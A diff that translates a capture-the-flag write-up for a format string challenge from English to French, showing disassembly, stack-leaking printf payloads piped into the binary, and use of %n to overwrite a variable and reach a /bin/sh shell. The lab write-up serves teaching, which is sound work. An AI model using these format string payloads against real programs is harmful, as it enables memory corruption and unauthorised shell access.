@@ -1,6 +1,6 @@
-# Level 3
+# 03 - Format string 1
 
-- We login as user level3:
+- On se connecte en tant que level3:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
@@ -60,7 +60,7 @@ End of assembler dump.
 ```
 
 
-- Let's identify the calls and jump:
+- Voyons les parties les plus importantes du programme:
 ```
    0x080484ad <+9>:     mov    0x8049860,%eax
    0x080484b2 <+14>:    mov    %eax,0x8(%esp)
@@ -69,20 +69,14 @@ End of assembler dump.
    0x080484c4 <+32>:    mov    %eax,(%esp)
    0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
 ```
->`0x8049860 <stdin@@GLIBC_2.0>: 0xb7fd1ac0`
-
->buffer size is 0x200 bytes
-
->buffer starts at `-0x208(%ebp)`
-
->Prompt the user for up to 512 bytes.
+> Prompt pour 512 octets dans une zone mémoire de 520 octets.
 
 ```
    0x080484cc <+40>:    lea    -0x208(%ebp),%eax
    0x080484d2 <+46>:    mov    %eax,(%esp)
    0x080484d5 <+49>:    call   0x8048390 <printf@plt>
 ```
->Call `<printf@plt>` with our buffer as first parameter.
+> Appel de `<printf@plt>` avec notre buffer comme premier paramètre.
 
 ```
    0x080484da <+54>:    mov    0x804988c,%eax
@@ -91,23 +85,7 @@ End of assembler dump.
 ```
 >`0x804988c <m>:  0x00000000`
 
->After the call to `<printf@plt>`, compare the value located at `0x804988c` with the constant 0x40 (64 in decimal). If the two values differ, we `leave` and then `ret`, otherwise we continue.
-
-```
-   0x080484e4 <+64>:    mov    0x8049880,%eax
-   0x080484e9 <+69>:    mov    %eax,%edx
-   0x080484eb <+71>:    mov    $0x8048600,%eax
-   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
-   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
-   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
-   0x08048504 <+96>:    mov    %eax,(%esp)
-   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
-```
->`0x8049880 <stdout@@GLIBC_2.0>:  0xb7fd1a20`
-
->`0x8048600: "Wait what?!\n"`
-
->Print `"Wait what?!\n"` into `<stdout>`.
+> Après l'appel à `<printf@plt>`, compare la valeur située à `0x804988c` avec la constante 0x40 (64 en décimal). Si les deux valeurs diffèrent, on `leave` puis on `ret`, sinon on continue.
 
 ```
    0x0804850c <+104>:   movl   $0x804860d,(%esp)
@@ -115,11 +93,10 @@ End of assembler dump.
 ```
 >`0x804860d: "/bin/sh"`
 
->Open a terminal.
+>Ouvre un terminal.
 
 
-- This exercice is an introduction to [format string exploit](https://axcheron.github.io/exploit-101-format-strings/).
-The content of our buffer is used as first parameter of the `<printf@plt>` function, so we can read/write anything from/to the stack.
+- Cette exercice est une introduction au [format string attack](https://axcheron.github.io/exploit-101-format-strings/). Le contenu de notre buffer est utilisé comme premier paramètre de la fonction `<printf@plt>`, donc on peut lire/écrire n'importe quoi sur la stack.
 ```
 level3@RainFall:~$ echo -ne 'BBBB %x %x %x %x %x \n' | ./level3
 BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520
@@ -136,7 +113,7 @@ level3@RainFall:~$ echo -ne '\x8c\x98\x04\x08 %4$x \n' | ./level3
 ```
 
 
-- With `<printf@plt>`, `%x` allows us to display a hexadecimal value, and `%n` allows us to assign a value to an address that corresponds to the number of characters written so far, so:
+- Avec `<printf@plt>`, `%x` nous permet d'afficher une valeur hexadécimale, et `%n` nous permet d'assigner une valeur à une adresse, cette valeur correspond au nombre de caractères écrits jusqu'au `%n` en question, du coup:
 ```
 level3@RainFall:~$ gdb level3
 ...
